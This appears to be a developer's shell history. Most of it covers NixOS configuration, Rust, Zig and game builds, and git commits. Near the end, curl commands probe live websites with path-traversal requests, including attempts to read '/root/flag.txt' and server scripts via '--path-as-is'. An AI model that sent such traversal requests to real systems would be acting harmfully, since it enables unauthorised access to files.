clear
ls
nvim ~/.dotfiles/system/packages.nix
z ~/Arduino/
nvim ls
ls
la
ls -la
eza
eza -a
clear
tree
tee
ls
nvim .zshrc
nvim ~/.dotfiles/nvim/init.lua
exit
nvim ~/.dotfiles/nvim/init.lua
exit
nvim ~/.config/nushell/env.nu
nvim ~/.dotfiles/nvim/init.lua
nvim ~/.config/nushell/env.nu
nvim ~/.dotfiles/nvim/init.lua
nvim ~/.config/nushell/env.nu
exit
;s
ls
clear
sudo nixos-rebuild switch
nvim ~/.config/nushell/env.nu
sudo nixos-rebuild switch
ls
sl
ls
ls -a
la
clear
ls -a
eza
eza --icons
eza --list --icons
eza -l --icons
eza -l --icons -a
eza -la --icons
nvim ~/.config/nushell/config.nu
exit
ls
ll
l
la
clear
ls | select 
\ls
nvim ~/.config/nushell/config.nu
exit
core-ls
ls
clear
core-ls
core-ls | select type=dir
core-ls | select type="dir"
core-ls | select type
42 | describe
core-ls
core-ls -a
core-ls -a | where type
core-ls -a | where type == dir
core-ls -a | where type == symlink
core-ls -a | where type != symlink
core-ls -a | where type =~ i
core-ls -a | where type =~ r
core-ls -a | where type =~ i
core-ls -a | where type =~ l
core-ls -a | where size > 1KiB
clear
[{a:1 b:2} {b:1}]
git config --global http.postBuffer 4096M 
z orco
git config --global http.postBuffer 8192M 
git config --global http.postBuffer 1M
zoxide init
zoxide init --help
direnv hook
direnv hook --help
direnv --help
direnv --help | rg hook
nvim ~/.zshrc ~/.config/nushell/config.nu
new-flake
flake-new
exit
flake-new
rm -rf flake.nix
$nu.env-path
nvim ~/.config/nushell/config.nu
exit
z game
pwd
clear
ls
z fine
z -
clear
ls
z game
git config --global http.postBuffer 4096M 
git config --global http.postBuffer 1M
nvim ~/.dotfiles/system/packages.nix
clear
sudo nixos-rebuild switch
nix-collect-garbage -d
clear
rm -rf ~/.cache/k*
clear
sudo nixos-rebuild switch
nix-collect-garbage -d
./run.sh
df -h
fastfetch
df -h
sudo nixos-rebuild switch
nvim ~/.dotfiles/system/packages.nix
df -h
sudo nixos-rebuild switch
z .dot
exit
exit
nvim ~/.dotfiles/system/packages.nix
exit
z .
z .dot
git status
git restore flake.lock
git status
clear
df -h
sudo nixos-rebuild switch
clear
sudo nixos-rebuild switch
clear
sudo 
clear
sudo nixos-rebuild switch
ondsel
Ondsel
clear
sudo nixos-rebuild switch
clea
clear
sudo nixos-rebuild switch
ls /nix/store/vc947b96yhf5vvk0qhcj57g7j4m7xbns-ondsel-weekly-extracted/
clear
nix-collect-garbage -d
clear
sudo nixos-rebuild switch
clear
sudo nixos-rebuild switch
clear
sudo nixos-rebuild switch
ondsel
nvim ~/.dotfiles/system/packages.nix
flake update
clear
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild switch
clear
./run.sh
git mv coders util/coders
clear
./run.sh
cleaar
clear
./run.sh
nix develop -c nu
clear
./run.sh
clear
./run.sh
clear
./run.sh
clear
./run.sh
celar
clear
./run.sh
clear
./run.sh
clear
./run.sh
clear
./run.sh
clear
./run.sh
clear
./run.sh
btop
z .orf
z .org
clear
ls
orestaty build
~/.cargo/bin/orestaty build
git add .
git commit -m "Finally fix twitter (crossed) X"
git push
git pull
git push
~/.cargo/bin/orestaty build
git add .
git commit -m "Website link fix"
git push
git add .
~/.cargo/bin/orestaty build
git add .
git commit -m "+Reddit -[Needs links]"
git push
nvim src
nvim ~/.config/nushell/config.nu
exi
exit
exit
nvim ~/.config/nushell/config.nu
exit
cargo
nvim ~/.config/nushell/config.nu
bash
sh
exi
exit
$env.PATH
$env.PATH | describe
$env.PATH | append ""
$env.PATH | append ''
$env.PATH | append "~/.cargo/bin"
$env.PATH = $env.PATH | append "~/.cargo/bin"
$env.PATH = ($env.PATH | append "~/.cargo/bin")
$env.PATH
config nu --default | nu-highlight | lines<\n>
exit
zoxide
$env.PATH
exit
$env.PATH
orestaty --version
carapace
exit
carapace
config nu --default | nu-highlight
z .dot
ls
mv -r ~/.config/nushell .
z ,dot
z .dot
git add .
./fetch.sh
git add .
git commit -m "NuShell"
git push
spectacle
z games
ls
pwd
z /mnt/Dev/Games/GameJams/10-catch-the-countdown/
direnv allow
cargo run
ls
cargo run
direnv reload
cargo run
nix-shell --run bash
clear
direnv reload
cargo run
nix-shell --run nu
cargo run
exit
cargo run
exit
nix-shell --run nu
exit
nix-shell --run nu
clear
nix-shell --run nu
clear
nix-shell --run nu
clear
cargo run
direnv reload
clear
cargo run
exit
nix-shell --run nu
exit
nix-shell --run nu
cargo run
git restore shell.nix
exit
cargo run
new-flake
rm -rf .envrc
rm -rf .direnv
flake-new
clear
nix develop -c nu
git add .
cargo run
rm -rf shell.nix
cargo run
exit
nix develop -c nu
exit
nix develop -c nu
clear
cargo run
exit
cler
clear
cargo run
exit
nix develop -c nu
clear
cargo run
exit
nix develop -c nu
clear
cargo run
exit
nix develop -c nu
clear
cargo run
exit
nix develop -c nu
clearcargo run
clear
cargo run
glxinfo
nix run nixpkgs#nixGL
nix run github:guibou:nixGL
nix run github:guibou/nixGL
exit
nix run github:guibou/nixGL
cargo run
exit
nix develop -c nu
clear
cargo run
exit
cargo run
clear
cargo run
btop
chromium-browser 
btop
z ,dot
z .dot
clear
git status
z system
ls
git log
ls
git reset ^HEAD -- configuration.nix
git restore configuration.nix
git restore configuration.nix HEAD^
git reset HEAD^1 configuration.nix 
git diff configuration.nix
git reset HEAD^2 configuration.nix 
git reset HEAD^^ configuration.nix 
git diff configuration.nix
git status
git restore configuration.nix
git log
pkill gitkraken
while true; pkill gitkraken
while true {pkill gitkraken}
pkill gitkraken
s
clear
nvim ~/.dotfiles/system/packages.nix
sudo lshw -c display 
sudo nixos-rebuild switch
exit
clear
z orco
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
clea
clear
./compile.sh simple
cl
./compile.sh simple
git add .
git commit -m "Floats"
clear
./compile.sh simple
echo $?
cler
clear
./compile.sh simple
echo $env.LAST_EXIT_CODE
$env.LAST_EXIT_CODE
clear
./compile.sh simple
$env.LAST_EXIT_CODE
clear
git add .
git commit -m "Semicolon after function body if it's not a block"
git push
clear
cargo add codespan --package orco
cargo add codespan-reporting --package orco
clear
cargo add annotate_snippets --package orco
git status
git reset --hard
clear
./c
clear
./compile.sh simple
z verbose
python -m src.main
python -m src.main aluminium
python -m src.main aluminum
z staty
nvim .
z chatry
clear
clear
cargo run --release --package chatry
nvim .
clear
z orco
clear
nvim 
q
clea
clear
./com
clear
./compile.sh simple
clear
./compile.sh simple
./compile.sh calc
clear
./compile.sh calc
clear
./compile.sh calc
clear
./compile.sh calc
clear
./compile.sh calc
clear
./compile.sh calc
clear
./compile.sh calc
clear
./compile.sh calc
clear
./compile.sh calc
clear
git add .
git commit -m "Fix tail return bugs"
git push
clear
python -m src.main Asia
./compile.sh calc
cargo run --release --package chatry
spectacle
git statu
git status
git push
pkill gitkraken
gitkraken
pkill gitkraken
while true { pkill gitkraken }
pkill gitkraken
$env.LAST_EXIT_CODE
fastfetch
sudo nixos-rebuild switch
reboot
lsmod | grep nouveau
sudo nixos-rebuild switch
reboot
lsmod | grep nouveau
clear
gitkra
gitkraken 
chromium
clear
z verbose
clear
z chatry
ondsel
clear
pkill ondsel
sudo nixos-rebuild switch
nvim ~/.dotfiles/system/packages.nix
reboot
sh
sudo lshw -c display 
gitkraken
clear
z chatry
clear
z orco
clear
ls
git status
git add .
git comit -m "Return separated"
# git commit -m "Return separated"
git branch metadata
git branch --list
clear
git branch --list
git checkout metadata
git status
git branch --list
clear
ls /mnt
file /mnt/D
lsblk
lsblk -o 'FSTYPE'
lsblk -o 'MOUNTPOINT,FSTYPE'
cargo add derivative --package orco
fastfetch
cargo run --release --package chatry
clear
z verbose
clear
python -m src.main miette
clear
python -m src.main miette
clear
ls
clear
./compile.sh calc
clear
fastfetchs
clear
fastfetchs
clear
fastfetch
gitkraken
pwd
python -m src.main Nouveau
clear
cargo add miette
# cargo add miette --package orco
git status
git add .
git commit -m "Metadata first steps"
git push
cargo add miette --package orco
core-ls | select type
cargo add thiserror
cargo add thiserror --package orco
cargo add miette --package orco-cli --features fancy
cargo run --release --package chatry
spectacle
pkill ondsel
ondsel-es 
clear
ondsel-es 
clear
ondsel-es 
pkill ondsel
clear
ondsel-es 
clear
ondsel-es 
nvim .
z chatry
clear
nvim .
clear
z Bots
ls
cd Platforms/
ls
z tinytwitch/
ls
go run irc.go
clear
go run irc.go
z orco
clear
./compile.sh simple
clear
z verbose
clear
python -m src.main eyre
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
clear
./compile.sh simple
spectacle
git add .
git commit -m "First error message"
git push
clear
z ToolsIUse
clear
pwd
clear
ls
git clone https://github.com/inimino/cmpr.git
z cmpr
cle
clear
make
ls
sudo make install
bat Makefile 
dist/cmpr
nix-store add-path
nix-store add-path --help
nix-store --help
nix-store --add-path --help
nix store add-path dist/cmpr
exit
cmpr
z -
ls
z cmpr
clear
z ToolsIUSe
clear
nix run nixpkgs#steam
export NIXPKGS_ALLOW_UNFREE=1<\n>
NIXPKGS_ALLOW_UNFREE=1
$env.NIXPKGS_ALLOW_UNFREE=1
set env.NIXPKGS_ALLOW_UNFREE=1
z ToolsIUSe
ls
z cmpr
clear
z Downloads
cp /mnt/Dev/ToolsIUse/cmpr/dist/cmpr .
mkdir test
mv cmpr test
cd test
clear
ls
./cmpr --init
clear
ls
./cmpr --init
ls
la
ls cmpr
la .cmpr
export EDITOR=emacs
$env.EDITOR = "nvim"
./cmpr --init
./cmpr
touch main.pu
touch main.py
ls
rm -rf main.pu
clear
./cmpr
nvim main.oy
nvim main.py
./cmpr
rm -rf .cmpr
rm -rf main.py
touch main.py
./cmpr
./cmpr --init
./cmpr
nvim main.py
rm -rf .cmpr
./cmpr
./cmpr --init
./cmpr
nvim main.py
./cmpr
nvim main.py
rm -rf main.py
rm -rf .cmpr/
clear
ls
rm -rf ";s"
cla
clear
./cmpr
./cmpr --init
./cmpr
exit
nvim main.c
clear
./cmpr
$env.EDITOR = "vim"
./cmpr
$env.EDITOR = "vi"
./cmpr
vi
./cmpr
clear
wl-copy
wl-copy "sss"
wl-paste
ls
./test
clear
s
ls
./cmpr
touch flake.nix
flake-new
nvim .
fastfetch
which bash
clear
file
exit
nix shell nixpkgs#file
file
sudo nixos-rebuild switch
sudo nixos-rebuild switch -j 1
file
./compile.sh calc
./compile.sh simple
nmtui
nmcli
c;ear
clear
iwctl
clear
core-ls | ls $in.1
core-ls # | ls $in.1
core-ls | select name | ls $in.1
core-ls | select name
core-ls | select name | each {ls $in}
core-ls | each { ls $in.name }
core-ls | each { rm -rf $in.name/*.import }
core-ls | each { rm -rf $in.name /*.import }
core-ls | each { ls $in.name }
core-ls | each { ls $in.name/ }
core-ls | each { ls $in.name + "/" }
core-ls | each { ls ($in.name + "/") }
core-ls | each { ls ($in.name + "/*.import") }
core-ls | each { core-ls $in.name }
core-ls **/*.import
ls **/*.import
ls */*.import
core-ls -a **/*xxx*
glob **
glob *
glob **
glob *
glob *&
glob **
glob *
glob -a ** | where $in =~ ".import"
glob **/*import
glob **/*
glob **/*.import
glob **/*.import*
glob **/*import*
glob **/*
glob **/* | $in
glob **/* | where $in =~ .png
glob **/* | where $it =~ .ron
glob **/* | where $it =~ .ron | each {|file| ls file}
glob **/* | where $it =~ .ron | each {|file| file}
glob **/* | where $it =~ .ron | each {|file| $file}
glob **/* | where $it =~ .ron | each {|file| rm -rf $file}
z catch-the-countdown
z Jam
z Games
ls
z Games
z /mnt/Dev/Games/GameJams/10-catch-the-countdown/
z catch
z 10
z /mnt/Dev/Games/GameJams/10-catch-the-countdown/
ls
clear
cargo run
exit
nix develop -c nu
cargo run
exit
echo "use flake" > .envrc && direnv allow
echo "use flake" > .envrc; direnv allow
ls
la
bat .envrc
echo "use flake" > .envrc; direnv allow
echo "use flake" >> .envrc; direnv allow
echo "use flake" >> .envrc
ls
echo "use flake" | save .envrc; direnv allow
"use flake" | save .envrc; direnv allow
clear
direnv reload
cargo run
rm -rf target
cargo run
glxinfo
nix run nixpkgs#glxinfo
clear
cargo run
nix run nixpkgs#glxinfo | rg version
cargo run
direnv reload
exi
exit
cargo run
git status
git reset Cargo.toml
git status
git restore Cargo.toml
git restore build.rs
rm -rf build.rs
clear
exit
cargo run
exit
cargo run
adjtimex
z orco
cd Downloads/
clear
git clone https://github.com/krepa098/stl2thumbnail && cd stl2thumbnail<\n>cmake -DCMAKE_INSTALL_PREFIX="/usr"<\n>cmake --build . --config Release<\n>sudo make install
git clone https://github.com/krepa098/stl2thumbnail; cd stl2thumbnail<\n>cmake -DCMAKE_INSTALL_PREFIX="/usr"<\n>cmake --build . --config Release<\n>sudo make install
flake-new
vim flake.nix
git clone https://github.com/krepa098/stl2thumbnail; cd stl2thumbnail<\n>cmake -DCMAKE_INSTALL_PREFIX="/usr"<\n>cmake --build . --config Release<\n>sudo make install
ls
pwd
cd -
rm -rf stl2thumbnail/
nix develop -c nu
git add .
nix develop -c nu
vim flake.nix
cle
clear
nix develop -c nu
vim flake.nix
exit
cd Downloads/stl2thumbnail/
cmake -DCMAKE_INSTALL_PREFIX="/usr"
vim flake.nix
exit
nix develop -c nu
cmake -DCMAKE_INSTALL_PREFIX="/usr"
nix-index
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild switch -j 1
vim flake.nix
libpng-config --cflag
libpng-config --prefix
cmake -DCMAKE_INSTALL_PREFIX="/usr"
vim flake.nix
cmake -DCMAKE_INSTALL_PREFIX="/usr"
exi
exit
nix develop -c nu
cmake -DCMAKE_INSTALL_PREFIX="/usr"
vim flake.nix
exit
cmake -DCMAKE_INSTALL_PREFIX="/usr"
cd Downloads
clear
cd ..
git clone https://github.com/unlimitedbacon/stl-thumb-kde.git
mkdir build
cd build/
cmake -DCMAKE_BUILD_TYPE=Release ..
pwd
cd stl-thumb-kde
cd ..
cd stl-thumb-kde/
mkdir build; cd build
cmake -DCMAKE_BUILD_TYPE=Release ..
nix shell "nixpkgs#ecm_"
cargo install stl-thumb
cmake -DCMAKE_BUILD_TYPE=Release ..
exit
nix shell nixpkgs#ecm
cmake -DCMAKE_BUILD_TYPE=Release ..
exit
nix shell nixpkgs#kdePackages.extra-cmake-modules nixpkgs#kdePackages.kio
cmake -DCMAKE_BUILD_TYPE=Release ..
exit
nix shell nixpkgs#kdePackages.extra-cmake-modules nixpkgs#kdePackages.kio nixpkgs#kdePackages.qtbase
cmake -DCMAKE_BUILD_TYPE=Release ..
exit
nix shell nixpkgs#kdePackages.extra-cmake-modules nixpkgs#kdePackages.kio nixpkgs#kdePackages.full
cargo install stl-thumb
clear
cmake -DCMAKE_BUILD_TYPE=Release ..
ls /nix/store/ikqvl8jq0d7vlp25d9zlbh44m4hljahc-qtbase-6.7.1/lib/cmake/Qt6Widgets/Qt6WidgetsConfig.cmake
bat /nix/store/ikqvl8jq0d7vlp25d9zlbh44m4hljahc-qtbase-6.7.1/lib/cmake/Qt6Widgets/Qt6WidgetsConfig.cmake
cmake -DCMAKE_BUILD_TYPE=Release ..--debug-find-pkg=Qt6Widgets
cmake -DCMAKE_BUILD_TYPE=Release .. --debug-find-pkg=Qt6Widgets
clear
cargo uninstll stl-thumb
cargo uninstall stl-thumb
clear
z Downloads
git clone https://github.com/lilith645/TwitchEventSub-rs.git
cd TwitchEventSub-rs/
cargo doc --open
exit
nix shell nixpkgs#pkg-config
cargo doc --open
PKG_CONFIG_PATH = "${pkgs.openssl.dev}/lib/pkgconfig";
$env.PKG_CONFIG_PATH = "${pkgs.openssl.dev}/lib/pkgconfig";
cargo doc --open
$env.PKG_CONFIG_PATH = $"(^'nix eval nixpkgs#openssl.dev.outPath')/lib/pkgconfig";
nix eval nixpkgs#openssl.dev.outPath
$env.PKG_CONFIG_PATH = "/nix/store/191vca5vdxdlr32k2hpzd66mic98930f-openssl-3.0.13-dev/lib/pkgconfig";
cargo doc --open
cargo test
ping google.com
z verbose
clear
ping 1.1.1.1
clear
z orco
clear
cargo add downcast-rs --package orco
python -m src.main exclamation
clear
./compile.sh simple
cargo add dyn-clone
cargo add dyn-clone --package orco
./compile.sh simple
cle
clear
./compile.sh simple
clear
cargo clippy
clear
cargo clippy
clear
./compile.sh simple
clear
which bash
clear
which sh
ls /bin
file /bin/sh
clear
cargo fmt
cle
clear
./compile.sh simple
git add .
git commit -m "Some more migraton"
git push
clear
z cmpr
cd /mnt
cd /mnt/Dev
ls
z ToolsIUse/cmpr/
clear
z ToolsIUse/cmpr
ls
clear
make
ls
make
make install
git status
git reset --hard
make install
cp cmpr ~/Downloads
cp dist/cmpr ~/Downloads
cd Downloads
ls
cd ~/Downloads
ls
mv cmpr test
cd test/
ls
cmpr
exit
nix shell nixpkgs#python3
nvim cmpr.c
z Down
clea
clear
./cmpr
ls
cd test
clear
./cmpr
clear
z orco
cargo clippy
z verbose
clear
python -m src.main occured
python -m src.main occurency
python -m src.main occur
python -m src.main occured
python -m src.main occurred
clear
cargo clippy
clear
cargo clippy
./compile.sh simple
cargo doc --open
./compile.sh simple
clear
./compile.sh simple
cargo doc --open
clear
cargo doc --open
git add ,
git add .
git commit -m "Macro"
git push
./compile.sh simple
git add .
git commit -m "Symbols migrated partially"
./compile.sh simple
git add 
git add .
git commit -m "Symbol resolving using metadata"
git push
clear
nvim .
nvim ~/.dotfiles/nvim/init.lua
nvim
nvim ~/.dotfiles/system/packages.nix
sudp nixos-rebuild switch
sudo nixos-rebuild switch
cfdisk
cfdisk /dev/nvme0n1 
sudo cfdisk /dev/nvme0n1 
sudo partitionmanager 
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild boot
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild boot
sudo cfdisk /dev/nvme0n1 
clear
sudo nixos-rebuild boot
clear
spectacle
z Python
ls
z /mnt/Dev
l
z Tools/
ls
z graphics/
ls
mkdir imgen
z imgen/
clear
python main.py
flake-new
exit
clear
python main.py
ls
flake-new
echo "use flake" | save .envrc; direnv allow
clear
direnv reload
exit
direnv reload
nvim ~/.dotfiles/nushell/config.nu 
exit
exit
direnv reload
clear
zig
clear
zig init
zig build --help
zig fetch --save https://github.com/Not-Nik/raylib-zig
zig fetch --save https://github.com/Not-Nik/raylib-zig/archive/devel.tar.gz
zig build
zig run
zig
zig run --help
zig build-exe
zig build run
emsdk install latest
nvim .
emsdk
direnv reload
fh add "jeff-hykin/emscripten/3.1.2"
nvim ~/.dotfiles/system/packages.nix
direnv reload
emsdk
emcc
where emcc
which emcc
direnv reload
emcc
direnv reload
$env.EMSCRIPTEN_SYSROOT
clear
zig build -Dtarget=wasm32-emscripten --sysroot $env.EMSCRIPTEN_SYSROOT
emcc-cache
emcc --cache
emcc --cache ~/.emscripten
zig build -Dtarget=wasm32-emscripten --sysroot $env.EMSCRIPTEN_SYSROOT
emcc build MINIMAL
emscripten build MINIMAL
emsdk
am++
em++
clear
ls $env.EMSCRIPTEN_SYSROOT
ls $env.EMSCRIPTEN_SYSROOT/bin
ls $"($env.EMSCRIPTEN_SYSROOT)/bin"
zig build -Dtarget=wasm32
zig build -Dtarget=wasm32-unknown
zig build -Dtarget=wasm32-unknown-unknow
zig build -Dtarget=wasm32-freestanding-unknow
zig build -Dtarget=wasm32-wasi
zig build -Dtarget=wasm32-emscripten --sysroot $env.EMSCRIPTEN_SYSROOT
z /mnt/Dev
ls
z Languages/C++/libraries/
s
ls
z ..
ls
z libraries/
git clone https://github.com/emscripten-core/emsdk.git
z emsdk/
./emsdk install latest
ls
./emsdk install latest
./emsdk activate latest
zig build -Dtarget=wasm32-emscripten --sysroot /mnt/Dev/Languages/C++/libraries/emsdk/upstream/emscripten
zig --version
zig version
zig zen
zig build -Dtarget=wasm32-emscripten --sysroot /mnt/Dev/Languages/C++/libraries/emsdk/upstream/emscripten
clear
zig build -Dtarget=wasm32-emscripten --sysroot /mnt/Dev/Languages/C++/libraries/emsdk/upstream/emscripten
clear
zig build -Dtarget=wasm32-emscripten --sysroot /mnt/Dev/Languages/C++/libraries/emsdk/upstream/emscripten
clear
zig build -Dtarget=wasm32-emscripten --sysroot /mnt/Dev/Languages/C++/libraries/emsdk/upstream/emscripten
ls
ls zig-out
ls zig-out/htmlout
pw
pwd
cd zig-out/htmlout/
ls
python -m http.server
exit
exit
tmux
clear
zig build run
direnv reload
exit
cler
clear
direnv reload
clear
direnv reload
cear
clear
zig build run
nvim .
zig build run
git add .
zig build run
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild switch
direnv reload
clear
ldtk > /dev/null &
ldtk > /dev/null 2>&1 &
ldtk > /dev/null out+err &
ldtk out+err> /dev/null &
nohup ldtk out+err> /dev/null &
clear
nohup ldtk out+err> /dev/null &
clear
zig build run
clear
zig build run
clear
zig build run
clear
zig build run
clear
zig build run
z verbose
clear
python -m src.main ambiguous
clear
python -m src.main ambiguous
clear
zig build run
modprobe
modprobe -h
clear
zig build run
clear
zig build run
direnv reload
clear
zig build run
clear
zig build run
zig build -Dtarget=wasm32-emscripten --sysroot /mnt/Dev/Languages/C++/libraries/emsdk/upstream/emscripten
python -m http.server
nix run nixpkgs#python3 -m http.server
nix run nixpkgs#python3 -- -m http.server
pwd
cd zig-out/htmlout/
cd -
zig build -Dtarget=wasm32-emscripten --sysroot /mnt/Dev/Languages/C++/libraries/emsdk/upstream/emscripten
zig build run
zig build -Dtarget=wasm32-emscripten --sysroot /mnt/Dev/Languages/C++/libraries/emsdk/upstream/emscripten
ff-play pickup.wav
zig build run
zig build -Dtarget=wasm32-emscripten --sysroot /mnt/Dev/Languages/C++/libraries/emsdk/upstream/emscripten
nvim .
clear
git add .
nix run nixpkgs#python3 -- -m http.server
git init
zig build --release
zig build --release=fast
zig build -Dtarget=wasm32-emscripten --sysroot /mnt/Dev/Languages/C++/libraries/emsdk/upstream/emscripten --release=fast
spectacle
java
java -jar ISOLATION.jar 
./Maou.x86_64
spectacle
nvim ~/.dotfiles/system/packages.nix
hx
helix
sudo nixos-rebuild switch
hx
clear
z orco
ls
nvim .
nvim
hx
hx ~/.config/helix/config.toml 
hx
clear
nix-env -iA fastfetch
nix-env -iA nixpkgs.fastfetch
nix-env -iA pkgs.fastfetch
z verbose
python -m src.main perminnety
nix profile install nixpkgs#neofetch
clear
hx ~/.dotfiles/system/packages.nix 
ls
cargo run
konsave --load coders-kde
konsave -l coders-kde
konsave -l
konsave -a coders-kde
plasma-shell
plasmashell
plasmashell --replace
konsave -a coders-kde
plasmashell --replace
plasmashell --replace &
cargo nextest run
cargo check
cargo clippy
:w
clear
hx ~/.config/helix/config.toml 
helix
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild switch
nix-collect-garbage -d
hx ~/.dotfiles/system/packages.nix 
sudo nixos-rebuild switch
hx ~/.dotfiles/system/packages.nix 
sudo nixos-rebuild switch
z orco
clear
cargo clippy
clear
./compile.sh calc
./compile.sh simple
clear
cargo clippy
./compile.sh simple
cargo clippy
git add .
git commit -m "Operators and block meta"
git push
spectacle
z orco
clear
hx .
nix store gc
nix profile history --profile /nix/var/nix/profiles/system
sudo nixos-rebuild switch
nix profile history --profile /nix/var/nix/profiles/system
clear
./compile.sh simple
git add .
git commit -m "Function call metadata"
git push
sudo nixos-rebuild boot
hx ~/.dotfiles/system/packages.nix 
reboot
hx
nvim ~/.dotfiles/system/packages.nix
sudo nixos-rebuild --install-bootloader boot
yarn tauri dev
spectacle
hx ~/.dotfiles/system/packages.nix 
sudo nixos-rebuild --install-bootloader boot
clear
sudo nixos-rebuild switch
hx ~/.dotfiles/system/packages.nix 
sudo nixos-rebuild switch
hx ~/.dotfiles/system/packages.nix 
sudo nixos-rebuild switch
hx ~/.dotfiles/system/packages.nix 
sudo nixos-rebuild switch
hx ~/.dotfiles/system/packages.nix 
sudo nixos-rebuild switch
hx ~/.dotfiles/system/packages.nix 
z dot
ls
git status
git diff system
./fetch.sh
git diff system
hx ~/.dotfiles/system/packages.nix 
hx ~/.dotfiles/system/flake.nix 
hx ~/.dotfiles/system/packages.nix 
clear
sudo nixos-rebuild switch
z orco
clear
git status
git clone https://github.com/InfiniteCoder01/BreakALoop.git 09-break-a-loop
./compile.sh simple
git add .
git commit -m "Return Metadata"
git push
nix run nixpkgs#ldtk
z play-me
ls
z game
clear
ls
z game
z orco
clear
cargo new orco-visual
cargo add ril --package orco-visual
clear
cargo buid
cargo build
nvim .
hx .
cargo add log --package orco-cli
cp compile.sh visualise.sh
./visualise.sh simple
cacaview
nix shell nixpkgs#cacaview
clear
cacaview ir.png
exit
nix shell nixpkgs#libcaca
clear
gwenview ir.png
clear
./visualise.sh simple
clear
cacaview ir.png
exit
nix shell nixpkgs#libcaca
clear
gwenview ir.png
./visualise.sh simple
gwenview ir.png
./visualise.sh simple
gwenview ir.png
./visualise.sh simple
clear
./visualise.sh simple
nvim .
z game
clear
sed -i 's/#include "(\.\.\/)*(constants.hpp)"/#include <\2>/g' *
sed -i 's/#include "\(\.\.\/\)*\(constants.hpp\)"/#include <\2>/g' *
sed -i 's/#include "\(\.\.\/\)*\(constants.hpp\)"/#include <\2>/g' **
sed -i 's/#include "\(\.\.\/\)*\(constants.hpp\)"/#include <\2>/g' files/WorldFiles.cpp
core-ls -a **/*xxx*
core-ls -a **
core-ls -a **/*.&
core-ls -a **/*.*
core-ls -a **/*.* | sed -i 's/#include "\(\.\.\/\)*\(constants.hpp\)"/#include <\2>/g' $in.nme
core-ls -a **/*.* | sed -i 's/#include "\(\.\.\/\)*\(constants.hpp\)"/#include <\2>/g' $in.name
core-ls -a **/*.* | each {|in| sed -i 's/#include "\(\.\.\/\)*\(constants.hpp\)"/#include <\2>/g' $in.name }
core-ls -a **/*.* | each {|in| sed -i 's/#include "\(\.\.\/\)*\(core_defs.hpp\)"/#include <\2>/g' $in.name }
core-ls -a **/*.* | each {|in| sed -i 's/#include "\(\.\.\/\)*\(delegates.hpp\)"/#include <\2>/g' $in.name }
core-ls -a **/*.* | each {|in| sed -i 's/#include "\(\.\.\/\)*\(engine.hpp\)"/#include <\2>/g' $in.name }
core-ls -a **/*.* | each {|in| sed -i 's/#include "\(\.\.\/\)*\(settings.hpp\)"/#include <\2>/g' $in.name }
core-ls -a **/*.* | each {|in| sed -i 's/#include "\(\.\.\/\)*\(typedefs.hpp\)"/#include <\2>/g' $in.name }
./run.sh
z orco
./visualise.sh simple
gwenview ir.png
./visualise.sh simple
gwenview ir.png
./visualise.sh simple
gwenview ir.png
./visualise.sh simple
gwenview ir.png
clear
./visualise.sh simple
gwenview ir.png
echo "core-ls -a **/*.* | each {|in| sed -i 's/#include "\(\.\.\/\)*\(constants.hpp\)"/#include <\2>/g' $in.name }" >> commands.tzt
echo "core-ls -a **/*.* | each {|in| sed -i 's/#include \"\\(\\.\\.\\/\\)*\\(constants.hpp\\)\"/#include <\\2>/g' $in.name }" >> commands.txt
clear
bash
curl 24.199.88.26
curl -d 24.199.88.26
wget 24.199.88.26
hx
curl https://cop.fish/api/fishdex/%2e%2e%2f
curl https://cop.fish/api/fishdex/%2e%2e%2fbadcop_%2fInfiniteCoder
curl https://cop.fish/api/fishdex/InfiniteCoder
curl https://cop.fish/api/fishdex/InfiniteCoder01
curl https://cop.fish/api/fishdex/%2e%2e%2fbadcop_%2fInfiniteCoder01
curl https://24.199.88.26
curl https://24.199.88.26/index.html
curl bashsta.cc
curl https://bashsta.cc
read -r -d '&' line
bash
clear
curl https://bashsta.cc
curl https://bashsta.cc/static
curl https://bashsta.cc/static/style.css
curl https://bashsta.cc/static/style.css/..
curl https://bashsta.cc/static/style.css/../..
curl https://bashsta.cc/static/style.css/../../..
curl https://bashsta.cc/static/style.css/../../
curl https://bashsta.cc/static/style.css/../../../
curl https://bashsta.cc/static/style.css/../../../../4
curl https://bashsta.cc/static/style.css/../../../../root/flag.txt
curl https://bashsta.cc/static/style.css/../../../../../root/flag.txt
curl https://bashsta.cc/static/style.css/../../../../../../root/flag.txt
curl https://bashsta.cc/static/style.css/../../../../../root/flag.txt
curl https://bashsta.cc/static/style.css/../../../../root/flag.txt
curl https://bashsta.cc/static/style.css/../\
curl https://bashsta.cc/static/style.css/../
curl https://bashsta.cc/static/style.css/
curl https://bashsta.cc/static/style.css
curl https://bashsta.cc/static/style.css/../
curl https://bashsta.cc/static/style.css/../../
curl https://bashsta.cc/static/style.css/../../pages
curl https://bashsta.cc/static/style.css/../../pages/[[...route]].sh
curl "https://bashsta.cc/static/style.css/../../pages/[[...route]].sh"
curl --real-path https://bashsta.cc/static/style.css/../../pages/[[...route]].sh
curl --help
curl --path
curl --path-as-is https://bashsta.cc/static/style.css/../../pages/[[...route]].sh
curl --path-as-is https://bashsta.cc/static/style.css/../../data/0-index.md
curl https://bashsta.cc/static/style.css/../../data/0-index.md
curl --path-as-is https://bashsta.cc/static/style.css/../../data/0-index.md
curl --path-as-is https://bashsta.cc/data/0-index.md
curl --path-as-is https://bashsta.cc/static/style.css/../../data/0-index.md
curl --path-as-is https://bashsta.cc/static//../../data/0-index.md
curl --path-as-is https://bashsta.cc/static/style.css/../..
curl --path-as-is https://bashsta.cc/static/style.css/../../data/0-index.md
mktemp
topic
read --help
bash
curl https://jeopardy.bashsta.cc/login
curl https://jeopardy.bashsta.cc/login.html
curl https://jeopardy.bashsta.cc/login
curl https://jeopardy.bashsta.cc/login.sh
curl https://jeopardy.bashsta.cc/score
curl https://jeopardy.bashsta.cc/login
curl https://jeopardy.bashsta.cc/buzz
curl https://jeopardy.bashsta.cc/logins
curl https://jeopardy.bashsta.cc/login -v
curl -s -D - -o /dev/null https://jeopardy.bashsta.cc/login
curl -s -D - -o /dev/null https://jeopardy.bashsta.cc/logins
